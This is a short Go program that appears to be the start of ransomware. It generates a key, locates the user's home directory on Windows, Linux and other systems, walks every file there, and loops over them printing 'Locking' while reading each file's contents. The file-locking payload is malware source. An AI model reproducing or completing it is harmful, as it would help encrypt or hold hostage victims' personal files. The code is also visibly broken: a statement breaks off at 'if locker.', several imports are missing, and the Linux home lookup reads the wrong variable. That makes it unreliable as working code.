package main

import (
	"os"
	"path/filepath"
	"runtime"

	"github.com/goLocker/locker"
)

func main() {
	var files []string
	var home string

	newkey := locker.KeyGen()

	// Grabbing path to users home directory.
	if runtime.GOOS == "windows" {
		home = os.Getenv("HOMEDRIVE") + os.Getenv("HOMEPATH")
		if home == "" {
			home = os.Getenv("USERPROFILE")
		}
	} else if runtime.GOOS == "linux" {
		home = os.Getenv("$HOME")

	} else {
		home = os.Getenv("Home")
	}

	err := filepath.Walk(home, locker.Walker(&files))
	if err != nil {
		panic(err)
	}
	for _, file := range files {
		if locker.
		fmt.Printf("Locking %d: %s", len(files), file)
		
		clearText, err := ioutil.ReadFile(file)
		if err != nil {
			log.Println("Error while reading file: ", err)

		}
	}
}
